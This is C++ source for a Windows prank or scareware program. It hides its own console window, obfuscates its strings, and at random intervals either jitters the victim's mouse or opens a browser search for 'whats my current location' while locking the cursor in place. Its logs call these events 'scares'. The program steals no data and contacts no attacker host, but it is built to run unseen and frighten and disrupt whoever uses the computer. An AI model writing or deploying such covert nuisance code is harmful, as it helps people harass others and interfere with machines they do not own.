#include "main.h"

auto random_int( int min, int max ) {
    std::uniform_int_distribution gen{ min, max };
    return gen( random::mersenne );
}

auto console::text::color( int color ) -> void {
    SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), color );
}

auto console::log( std::string input ) -> void {
    console::text::color( 8 );
    std::cout << xorstr( " [" );
    console::text::color( 10 );
    std::cout << xorstr( "+" );
    console::text::color( 8 );
    std::cout << xorstr( "] " );

    console::text::color( 7 );
    std::cout << input << std::endl;
}

auto launch::thread::mousejitter( ) {
    while ( true ) {
        if ( config::do_mousejitter ) {
            mouse_event( MOUSEEVENTF_MOVE, random_int( -4, 4 ), random_int( -4, 4 ), 0, 0 );

            std::this_thread::sleep_for( std::chrono::milliseconds( 25 ) );
        }
        else {
            std::this_thread::sleep_for( std::chrono::milliseconds( 1 ) );
        }
    }
}

auto launch::thread::browser( ) {
    while ( true ) {
        if ( config::do_browser ) {
            if ( !config::browser_opened ) {
                system( xorstr( "start https://www.google.com/search?q=whats+my+current+location" ) );

                config::browser_opened = true;
            }

            SetCursorPos( 1000, 1000 );

            std::this_thread::sleep_for( std::chrono::milliseconds( 5 ) );
        }
        else {
            std::this_thread::sleep_for( std::chrono::milliseconds( 1 ) );
        }
    }
}

auto launch::thread::main( ) {
    auto* mousejitter_handle = CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )launch::thread::mousejitter, 0, 0, 0 );
    auto* browser_handle = CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )launch::thread::browser, 0, 0, 0 );
    CloseHandle( mousejitter_handle );
    CloseHandle( browser_handle );

    console::log( xorstr( "Started thread: mousejitter" ) );
    console::log( xorstr( "Started thread: browser" ) );

    std::cout << std::endl;

    while ( true ) {
        config::do_scare = random_int( config::do_scare_min, config::do_scare_max );

        console::log( xorstr( "Randomizing scare" ) );

        //std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 300000, 600000 ) ) );
        std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 10000, 20000 ) ) );

        if ( config::do_scare == 1 ) {
            console::log( xorstr( "Picked mousejitter scare" ) );

            //std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 30000, 300000 ) ) );
            std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 10000, 20000 ) ) );

            console::log( xorstr( "Started mousejitter scare" ) );

            config::do_mousejitter = true;

            std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 1000, 60000 ) ) );

            config::do_mousejitter = false;
        }

        if ( config::do_scare == 2 ) {
            console::log( xorstr( "Picked do_browser scare" ) );

            //std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 30000, 300000 ) ) );
            std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 10000, 20000 ) ) );

            console::log( xorstr( "Started do_browser scare" ) );

            config::browser_opened = false;
            config::do_browser = true;

            std::this_thread::sleep_for( std::chrono::milliseconds( random_int( 1000, 10000 ) ) );

            config::do_browser = false;
        }

        if ( config::do_scare == 3 ) {
            console::log( xorstr( "Picked NULL scare" ) );
            console::log( xorstr( "Started NULL scare" ) );
        }
    }
}

auto main( ) -> int {
    //ShowWindow( GetConsoleWindow( ), SW_SHOW );
    ShowWindow( GetConsoleWindow( ), SW_HIDE );
	SetConsoleTitleA( "" );

    console::log( xorstr( "Started thread: main" ) );

    auto* main_handle = CreateThread( 0, 0, ( LPTHREAD_START_ROUTINE )launch::thread::main, 0, 0, 0 );
    CloseHandle( main_handle );

    while ( true ) {
        std::this_thread::sleep_for( std::chrono::milliseconds( 5 ) );
    }

    return 0;
}